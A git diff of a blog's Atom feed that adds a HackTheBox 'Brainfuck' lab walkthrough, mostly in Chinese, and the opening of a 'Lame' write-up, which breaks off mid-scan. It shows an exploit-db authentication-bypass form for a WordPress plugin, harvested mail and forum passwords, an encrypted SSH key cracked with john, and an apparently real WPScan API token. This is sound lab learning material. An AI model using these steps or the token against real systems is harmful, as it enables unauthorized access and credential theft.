@@ -1,7 +1,651 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-17T21:00:43+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">HackTheBox - Holiday</title><link href="http://localhost:4000/hack-the-box/holiday/" rel="alternate" type="text/html" title="HackTheBox - Holiday" /><published>2023-04-18T00:00:00+08:00</published><updated>2023-04-18T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/holiday</id><content type="html" xml:base="http://localhost:4000/hack-the-box/holiday/"><![CDATA[<p><img src="/images/hackthebox/holiday/0.png" alt="" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-18T18:53:18+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">HackTheBox - Brainfuck</title><link href="http://localhost:4000/hack-the-box/brainfuck/" rel="alternate" type="text/html" title="HackTheBox - Brainfuck" /><published>2023-08-14T00:00:00+08:00</published><updated>2023-08-14T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/brainfuck</id><content type="html" xml:base="http://localhost:4000/hack-the-box/brainfuck/"><![CDATA[<h1 id="hackthebox---brainfuck">HackTheBox - Brainfuck</h1>
+<h2 id="about-brainfuck">About Brainfuck</h2>
+<p>Brainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many.</p>
 
-<h2 id="信息搜集">信息搜集</h2>
-<h3 id="nmap">nmap</h3>
+<p><img src="/images/hackthebox/brainfuck/0.png" alt="" /></p>
+
+<h2 id="nmap">Nmap</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ cat nmap.txt 
+# Nmap 7.93 scan initiated Sun Aug 13 23:13:58 2023 as: nmap -n -v -sC -sV --min-rate=1500 -p- -oN nmap.txt 10.10.10.17
+Nmap scan report for 10.10.10.17
+Host is up (0.42s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA)
+|   256 6bd5dc153a667af419915d7385b24cb2 (ECDSA)
+|_  256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519)
+25/tcp  open  smtp     Postfix smtpd
+|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+110/tcp open  pop3     Dovecot pop3d
+|_pop3-capabilities: SASL(PLAIN) PIPELINING UIDL USER TOP RESP-CODES AUTH-RESP-CODE CAPA
+143/tcp open  imap     Dovecot imapd
+|_imap-capabilities: ID capabilities more AUTH=PLAINA0001 have IDLE listed LOGIN-REFERRALS IMAP4rev1 post-login Pre-login OK ENABLE LITERAL+ SASL-IR
+443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-title: Welcome to nginx!
+|_http-server-header: nginx/1.10.0 (Ubuntu)
+| tls-nextprotoneg: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
+| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
+| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
+| Public Key type: rsa
+| Public Key bits: 3072
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2017-04-13T11:19:29
+| Not valid after:  2027-04-11T11:19:29
+| MD5:   cbf1689996aaf7a005650fc094917f20
+|_SHA-1: f448e798a8175580879c8fb8ef0e2d3dc656cb66
+Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Aug 13 23:16:35 2023 -- 1 IP address (1 host up) scanned in 156.94 seconds
+</code></pre></div></div>
+<p>可以发现443端口的ssl证书内容中有几个域名，把这几个域名加到/etc/hosts里去和ip地址绑定，然后访问，得到了两个网站，一个是WordPress的博客，还得到了一个邮箱</p>
+
+<p><img src="/images/hackthebox/brainfuck/1.png" alt="" /></p>
+
+<p>还有一个网站是一个Super Secret Forum –超级神秘后台，在这里面我们可以看到两个用户名</p>
+
+<p><img src="/images/hackthebox/brainfuck/2.png" alt="" /></p>
+
+<h2 id="wpscan">WPScan</h2>
+<p>对第一个网站用WPScan扫描一下，加上扩展的漏扫和用户的枚举，要去官网注册一个免费的token，用这个token一天可以扫25次</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ WPScan --url https://brainfuck.htb/ --disable-tls-checks --api-token FD4Mg8hQgD3ufcCLEQPSghvDCFscCOTpEPJWb6V5lVA -e vp,u -o wpscan.txt
+</code></pre></div></div>
+<p>部分扫描结果</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ cat wpscan.txt       
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: https://brainfuck.htb/ [10.10.10.17]
+[+] Started: Mon Aug 14 00:43:37 2023
+
+[+] wp-support-plus-responsive-ticket-system
+ | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
+ | Last Updated: 2019-09-03T07:57:00.000Z
+ | [!] The version is out of date, the latest version is 9.1.2
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | [!] 6 vulnerabilities identified:
+ |
+ | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.0 – Authenticated SQL Injection
+ |     Fixed in: 8.0.0
+ |     References:
+ |      - https://wpscan.com/vulnerability/f267d78f-f1e1-4210-92e4-39cce2872757
+ |      - https://www.exploit-db.com/exploits/40939/
+ |      - https://lenonleite.com.br/en/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/
+ |      - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system
+ |
+ | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.8 - Remote Code Execution (RCE)
+ |     Fixed in: 8.0.8
+ |     References:
+ |      - https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1
+ |      - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system
+ |
+ | [!] Title: WP Support Plus Responsive Ticket System &lt; 9.0.3 - Multiple Authenticated SQL Injection
+ |     Fixed in: 9.0.3
+ |     References:
+ |      - https://wpscan.com/vulnerability/cbbdb469-7321-44e4-a83b-cac82b116f20
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000131
+ |      - https://github.com/00theway/exp/blob/master/wordpress/wpsupportplus.md
+ |      - https://plugins.trac.wordpress.org/changeset/1814103/wp-support-plus-responsive-ticket-system
+ |
+ | [!] Title: WP Support Plus Responsive Ticket System &lt; 9.1.2 - Stored XSS
+ |     Fixed in: 9.1.2
+ |     References:
+ |      - https://wpscan.com/vulnerability/e406c3e8-1fab-41fd-845a-104467b0ded4
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7299
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15331
+ |      - https://cert.kalasag.com.ph/news/research/cve-2019-7299-stored-xss-in-wp-support-plus-responsive-ticket-system/
+ |      - https://plugins.trac.wordpress.org/changeset/2024484/wp-support-plus-responsive-ticket-system
+ |
+ | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.0 - Privilege Escalation
+ |     Fixed in: 8.0.0
+ |     References:
+ |      - https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f
+ |      - https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
+ |      - https://packetstormsecurity.com/files/140413/
+ |
+ | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.8 - Remote Code Execution
+ |     Fixed in: 8.0.8
+ |     References:
+ |      - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f
+ |      - https://plugins.trac.wordpress.org/changeset/1763596
+ |
+ | Version: 7.1.3 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
+
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] administrator
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] WPScan DB API OK
+ | Plan: free
+ | Requests Done (during the scan): 0
+ | Requests Remaining: 22
+
+[+] Finished: Mon Aug 14 00:44:17 2023
+[+] Requests Done: 28
+[+] Cached Requests: 41
+[+] Data Sent: 7.166 KB
+[+] Data Received: 84.54 KB
+[+] Memory used: 253.984 MB
+[+] Elapsed time: 00:00:39
+</code></pre></div></div>
+
+<p>可见有一个扩展叫做WP Support Plus，其存在多个漏洞，还检测到了用户admin以及administrator的存在。用searchsploit查一下这个扩展的漏洞，把注意力放在中间的权限提升漏洞上面</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ searchsploit WP Support Plus           
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                            |  Path
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities                                  | php/webapps/34589.txt
+WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation                                    | php/webapps/41006.txt
+WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection                                           | php/webapps/40939.txt
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ locate php/webapps/41006.txt
+/usr/share/exploitdb/exploits/php/webapps/41006.txt
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ more /usr/share/exploitdb/exploits/php/webapps/41006.txt
+# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
+# Date: 10-01-2017
+# Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: web
+
+1. Description
+
+You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().
+
+http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
+
+2. Proof of Concept
+
+&lt;form method="post" action="http://wp/wp-admin/admin-ajax.php"&gt;
+        Username: &lt;input type="text" name="username" value="administrator"&gt;
+        &lt;input type="hidden" name="email" value="sth"&gt;
+        &lt;input type="hidden" name="action" value="loginGuestFacebook"&gt;
+        &lt;input type="submit" value="Login"&gt;
+&lt;/form&gt;
+
+Then you can go to admin panel.
+
+</code></pre></div></div>
+<h2 id="exploit">Exploit</h2>
+
+<p>好的，也就是说我们在本地构建一个这样的表单，就可以任意用户登录了。创建一个文件login.html,内容为上面这个表单，再把网站，用户名填上去，然后用firefox打开这个文件点击login，再回到原来的brainfuck网站刷新一哈，admin就已经在线了</p>
+
+<p><img src="/images/hackthebox/brainfuck/3.png" alt="" /></p>
+
+<p>在后台可以看到一个SMTP的配置按钮
+<img src="/images/hackthebox/brainfuck/4.png" alt="" /></p>
+
+<p>点进去可以看到SMTP的用户名orestis和密码，修改一下前端即可看到密码</p>
+
+<p><img src="/images/hackthebox/brainfuck/5.png" alt="" /></p>
+
+<p>用获取到的用户名和密码登录Dovecot，得到两封邮件，里面有orestis在超级私密论坛的账号和密码</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ telnet 10.10.10.17 110
+Trying 10.10.10.17...
+Connected to 10.10.10.17.
+Escape character is '^]'.
++OK Dovecot ready.
+USER orestis
++OK
+PASS kHGuERB29DNiNE
++OK Logged in.
+LIST
++OK 2 messages:
+1 977
+2 514
+.
+RETR 1
++OK 977 octets
+Return-Path: &lt;www-data@brainfuck.htb&gt;
+X-Original-To: orestis@brainfuck.htb
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck (Postfix, from userid 33)
+        id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
+To: orestis@brainfuck.htb
+Subject: New WordPress Site
+X-PHP-Originating-Script: 33:class-phpmailer.php
+Date: Mon, 17 Apr 2017 17:15:40 +0000
+From: WordPress &lt;wordpress@brainfuck.htb&gt;
+Message-ID: &lt;00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb&gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+
+Your new WordPress site has been successfully set up at:
+
+https://brainfuck.htb
+
+You can log in to the administrator account with the following infrmation:
+
+Username: admin
+Password: The password you chose during the install.
+Log in here: https://brainfuck.htb/wp-login.php
+
+We hope you enjoy your new site. Thanks!
+
+--The WordPress Team
+https://wordpress.org/
+.
+RETR 2
++OK 514 octets
+Return-Path: &lt;root@brainfuck.htb&gt;
+X-Original-To: orestis
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck (Postfix, from userid 0)
+        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+To: orestis@brainfuck.htb
+Subject: Forum Access Details
+Message-Id: &lt;20170429101206.4227420AEB@brainfuck&gt;
+Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+From: root@brainfuck.htb (root)
+
+Hi there, your credentials for our "secret" forum are below :)
+
+username: orestis
+password: kIEnnfEKJ#9UmdO
+
+Regards
+.
+
+</code></pre></div></div>
+<h2 id="decrypt">Decrypt</h2>
+
+<p>用从邮件里得到的账号和密码登录super secret forum，在里面可以看到一段有趣的对话，主要内容是orestis向admin索要ssh key</p>
+
+<p><img src="/images/hackthebox/brainfuck/5.png" alt="" /></p>
+
+<p>其中一段对话用了vigenere加密，Google rumkin vigenere得到解密工具，用原文和密文得到key是fuckmybrain……
+<img src="/images/hackthebox/brainfuck/6.png" alt="" /></p>
+
+<p>将对话解密，得到了ssh key的下载地址</p>
+
+<p><img src="/images/hackthebox/brainfuck/7.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
+</code></pre></div></div>
+
+<p>把key下载下来，发现需要密码，于是用john破解，得到了密码是<code class="language-plaintext highlighter-rouge">3poulakia!</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ wget https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --no-check-certificate
+--2023-08-14 01:49:35--  https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
+Resolving brainfuck.htb (brainfuck.htb)... 10.10.10.17
+Connecting to brainfuck.htb (brainfuck.htb)|10.10.10.17|:443... connected.
+WARNING: The certificate of ‘brainfuck.htb’ is not trusted.
+WARNING: The certificate of ‘brainfuck.htb’ doesn't have a known issuer.
+The certificate's owner does not match hostname ‘brainfuck.htb’
+HTTP request sent, awaiting response... 200 OK
+Length: 1766 (1.7K) [application/octet-stream]
+Saving to: ‘id_rsa’
+
+id_rsa                            100%[=============================================================&gt;]   1.72K  --.-KB/s    in 0s      
+
+2023-08-14 01:49:39 (30.9 MB/s) - ‘id_rsa’ saved [1766/1766]
+
+                                                                                                                                        
+┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ ls
+id_rsa  login.html  nmap.txt  wpscan.txt
+                                                                                                                                        
+┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ cat id_rsa  
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382
+
+mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
+B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
+W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
+7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
+zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
+oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
+dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
+Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
+mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
+LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
+ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
+krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
+gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
+VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
+schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
+UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
+F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
+wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
+Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
+IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
+mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
+CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
+9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
+EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
+6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
+-----END RSA PRIVATE KEY-----
+                                                                                                                                        
+
+                                                                                                                                        
+┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ ssh2john id_rsa &gt; id_rsa2        
+                                                                                                                                        
+┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ cat id_rsa2
+id_rsa:$sshng$1$16$6904FEF19397786F75BE2D7762AE7382$1200$9a779a83f60263c001f8e2ddae0b722aa9eb7531f09a95864cd5bda5f847b0dcfc09f19d03181c8546877a84e3feb87f0769d2e3ef426012bc211dd5b79168ecfa160428c0030598971f9c2b4c350d7a9adc0f812e5b122342b0b3d8de6ba1a25b599afd5ed6a0927e57824d23bb9f4e143238450eefa3e560d44cf54105f0c00d42624adfb31df44ceee77c09a54a99edd29c83a00cfe8f5584e969897ed220d4fd75129a29ebce8e8a516f210532588fd351fb6656a158f7514667c25d2990cf11fd2369462104ed451037ac592d2e935e74d3ee650092b3051e73b79556dda673666ff4f33d9424c9b914b3cd5ba6a33dd712785a1a63f58e63285415a20fed91ae72fac27cfd92cb15fad802574983f7b592fb5c9d5843de0a9874e8c7a674b4762f5baf04625ebfc8bd84fded869d68c2f33c1e089dc9f302daf381bd76dc000ddb0cabd1e23b33da86dfe4017e16fb7aa6632e8b1f216e2a4fd75d94b39e324effe1c82f8ce60d61594ba3e72e31a2f82bd0b2df236a467be16fe655d399cce773566a0d8e65ae5996cd3bec5bb87bae6f4b2a01221e7f601a0aa23a544a9f915497e0e57da00c1d689850a62c2d2315bc323ac3cf2065bd74d8a0f6938355d0fe8e7572022403046b59923a4fcb4bf98b3b87b4377c045fe36d8156eaba5f60b929686dab085f90e401c63e111de3fbf61e7e9c849d8b3efed7d34f5a0cf814774d54a525c3abbcd9ab232e7d92b295b6e97101e8d5433c489963940d80bde3b4d7bbd040b21d0c2e82ada4844bdc771bbbebe2f4be679f92e484efd581d3323b2013a2bec09aedb16fddce3b9e572a4075962c36ae55a0eac0695ccd56520a0c416e7429ea3a3b48f37867c057098cef65db6ae82684a5b6e6aff8ebfc8be1530ab83c872f91dcf8ebf9bf76d0f74f29f94adfd38769be3f528c1ce7b1c86aa33a20702d547c97029ba725fbdebb18505adeb0f9603a77c76c72215f5241dc06bc7d1921ca7474a2a431566d517f214eabf544e4780a4f06d7333a59ce10a87e8352a1a2dedafb9d8c32ef0c75249e96461a7259d2feb2ef1ff7a2a717b83064bb553fceddf11dee0044599f114ef4cb8e654dbe3c49c35dd48248cbf7a97f45bcf618dce3ca6ecc62032f8cc197b32cd8a9f345e671527019462c767fa207f50f31d757d76277d1851bb70fd1df84d08911548562d316b98e68b69b22a9792fed0911b799f4ee7a0da5c5a8fde05e1331f3104a5106b1d9ec684eb7a8c42239edac41401a9384483f1d30b22103e61d6dfa9b1b5cf8894c0c4c5d2c7583ee69cdb88752862011e9b5d861233713bdb97f32c4d4c16ee395641c38859b1cbd11543ebf8f64838c85c1434f3dbb0ea6929cee0256a52d58fe2fab0ca83c64d5774c86f94c0a88a9046066aa4f0af7cf46998b511427be5cbcf575fdec918945218985b002a943199dfc05a7167c68fb15c2ca17472bae6f8ddaec6b45f438b209b846b85db361c98a8d1e4438e4fb1ec82a40870038c216e79ab6149a6a1f5f8f53c7887c5ce4854634aa819210116466e08fcae8d8393caf4197b0c9df9ac7bdc7388ed91e8cbc0b10e48d26c85f200bc806bb229dda81db4e3e79a2ea10fe8f1bdba71160f2281db59961f4fb1f22090d64af11aa73f29803c2caf466f1ceef6451f84b04200f91574f0190
+                                                                                                                                        
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ sudo john id_rsa2 --wordlist=/usr/share/wordlists/rockyou.txt
+[sudo] password for kali: 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+3poulakia!       (id_rsa)     
+1g 0:00:00:05 DONE (2023-08-14 01:56) 0.1689g/s 2104Kp/s 2104Kc/s 2104KC/s 3prash0..3pornuthin
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                      
+</code></pre></div></div>
+<p>然后连接ssh，成功获取到user flag</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ sudo ssh -i id_rsa orestis@10.10.10.17
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+You have mail.
+Last login: Mon Oct  3 19:41:38 2022 from 10.10.14.23
+orestis@brainfuck:~$ ls
+debug.txt  encrypt.sage  mail  output.txt  user.txt
+orestis@brainfuck:~$ cat user.txt
+2c11cfbc5b959f73ac15a3310bd097c9
+
+</code></pre></div></div>
+
+<h2 id="lxd提权">Lxd提权</h2>
+
+<p>用户在lxd组中，所以可以用lxd提权</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>orestis@brainfuck:~$ id
+uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
+</code></pre></div></div>
+
+<ul>
+  <li><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">Lxd-Privilege-Escalation</a></li>
+</ul>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="linux" /><category term="web" /><category term="wordpress" /><category term="smtp" /><category term="vigenere" /><category term="ssh" /><category term="privilege-escalation" /><summary type="html"><![CDATA[HackTheBox - Brainfuck About Brainfuck Brainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many.]]></summary></entry><entry><title type="html">HackTheBox - Lame</title><link href="http://localhost:4000/hack-the-box/lame/" rel="alternate" type="text/html" title="HackTheBox - Lame" /><published>2023-04-22T00:00:00+08:00</published><updated>2023-04-22T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/lame</id><content type="html" xml:base="http://localhost:4000/hack-the-box/lame/"><![CDATA[<h1 id="hackthebox---lame">HackTheBox - Lame</h1>
+<h2 id="about-lame">About Lame</h2>
+<p>Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.</p>
+
+<p><img src="/images/hackthebox/lame/0.png" alt="" /></p>
+
+<h2 id="nmap">Nmap</h2>
+<p>扫一下端口</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/lame]
+└─$ cat nmap.txt
+# Nmap 7.93 scan initiated Sat Apr 22 00:01:10 2023 as: nmap -n -v -sC -sV -oN nmap.txt -Pn 10.10.10.3
+Nmap scan report for 10.10.10.3
+Host is up (0.55s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT    STATE SERVICE      VERSION
+21/tcp  open  ftp          vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.4
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh          OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
+|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
+139/tcp open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  microsoft-ds Samba smbd 3.0.20-Debian
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 2h00m22s, deviation: 2h49m45s, median: 20s
+| smb-os-discovery: 
